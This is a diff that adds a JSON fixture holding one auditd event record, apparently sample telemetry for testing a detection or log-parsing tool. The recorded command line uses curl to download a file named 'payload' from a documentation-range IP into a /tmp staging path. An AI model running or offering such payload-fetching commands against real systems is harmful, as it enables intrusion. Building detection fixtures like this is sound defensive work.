@@ -1,0 +1,11 @@
+[
+ {
+  "source": "auditd",
+  "image": "/usr/bin/curl",
+  "commandLine": "curl --connect-timeout 1 -o /tmp/bk-stage-12345 http://192.0.2.1/payload",
+  "user": "1000",
+  "pid": 12321,
+  "ppid": 12200,
+  "currentDirectory": "/home/alice"
+ }
+]
